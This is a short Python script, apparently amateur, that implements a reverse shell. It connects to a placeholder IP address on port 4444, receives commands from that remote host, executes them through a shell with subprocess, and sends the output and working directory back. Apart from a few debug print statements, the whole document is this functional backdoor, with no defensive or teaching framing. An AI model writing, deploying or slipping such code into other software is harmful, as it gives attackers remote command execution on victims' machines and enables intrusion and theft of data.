import socket
import subprocess
import os


host = "###.###.#.##"
port = 4444

print("Start")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
print("second")
s.connect((host,port))
print("third")
while True:
     print("while\n")
     data = s.recv(20480)
     if data[:2].decode("utf-8") == 'cd':
          os.chdir(data[3:].decode("utf-8"))
     if len(data) > 0:
          cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout = subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
          output_byte = cmd.stdout.read()+cmd.stderr.read()
          output_string = str(output_byte,"utf-8")
          currentWD = os.getcwd()+">"
          s.send(str.encode(output_string+currentWD))

          print(output_string)
